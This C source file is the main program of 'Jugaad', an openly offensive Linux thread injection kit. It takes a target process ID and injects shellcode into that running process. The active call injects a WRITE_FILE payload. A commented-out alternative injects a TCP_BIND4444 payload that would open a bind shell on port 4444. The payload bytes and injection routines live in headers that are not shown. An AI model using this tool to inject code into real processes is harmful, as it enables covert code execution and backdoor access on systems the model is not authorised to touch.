/*
 * Jugaad - Thread Injection Kit
 *
 * Author: Aseem Jakhar
 * Organization: null - The open security community
 * Websites: http://null.co.in   http://nullcon.net
 *
 * Copyright (c) 2011-2021 Aseem Jakhar <aseemjakhar_at_gmail.com>. All rights reserved.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 * THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING,
 * BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
 * PARTICULAR PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS
 * BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE
 * OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include <sched.h> /* For clone flags */
#include <stdlib.h>

#include <sys/mman.h> /* For mmap flags */

#include "debug.h"
#include "jugaad.h"
#include "shellcode.h"

static void usage(char * name)
{
    printf("Usage:>%s <pid>\n", name);
}

int main(int argc, char * argv[])
{
    int pid = 0;
    int ret = 0;

    if (argc != 2) {
        usage(argv[0]);
        exit(1);
    }
    pid = atoi(argv[1]);

    printf("Jugaad Version %s\n", jugaad_version());
    ret = create_remote_thread(pid,
                               20000,
                               (unsigned char *)WRITE_FILE,
                               (sizeof(WRITE_FILE) - 1));
    
    /*
    ret = create_remote_thread_ex(pid,
                                  20000,
                                  (unsigned char *)WRITE_FILE,
                                  (sizeof(WRITE_FILE) - 1),
                                  CLONE_THREAD | CLONE_VM | CLONE_SIGHAND,
                                  PROT_EXEC | PROT_READ | PROT_WRITE,
                                  MAP_PRIVATE | MAP_ANONYMOUS,
                                  (void *)DEFAULT_BKPADDR);
    
    ret = create_remote_thread_ex(pid,
                                  20000,
                                  (unsigned char *)TCP_BIND4444,
                                  (sizeof(TCP_BIND4444) - 1),
                                  CLONE_THREAD | CLONE_VM | CLONE_SIGHAND,
                                  PROT_EXEC | PROT_READ | PROT_WRITE,
                                  MAP_PRIVATE | MAP_ANONYMOUS,
                                  (void *)DEFAULT_BKPADDR);
    */
    printf("create_remote_thread() returned (%d)\n", ret);

    return 0;
}
